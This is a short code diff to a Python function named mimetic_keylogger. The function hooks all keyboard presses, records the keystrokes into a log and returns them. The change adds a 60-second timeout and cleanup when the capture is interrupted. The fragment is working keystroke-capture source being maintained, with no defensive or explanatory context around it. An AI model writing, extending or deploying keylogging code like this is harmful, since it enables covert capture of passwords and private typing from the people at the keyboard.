@@ -310,10 +310,20 @@ def mimetic_keylogger():
 
         keyboard.on_press(on_key_press)
 
-        # Wait for Ctrl+C or ESC
-        stop_event.wait()
+        # Wait for Ctrl+C/ESC with 60 second timeout
+        stopped = stop_event.wait(timeout=60)
         keyboard.unhook_all()
 
+        result = ''.join(log)
+        if stopped:
+            return result if result else "No keys recorded"
+        else:
+            return f"Timeout (60s): {result if result else 'No keys recorded'}"
+    except KeyboardInterrupt:
+        try:
+            keyboard.unhook_all()
+        except:
+            pass
         result = ''.join(log)
         return result if result else "No keys recorded"
     except Exception as e:
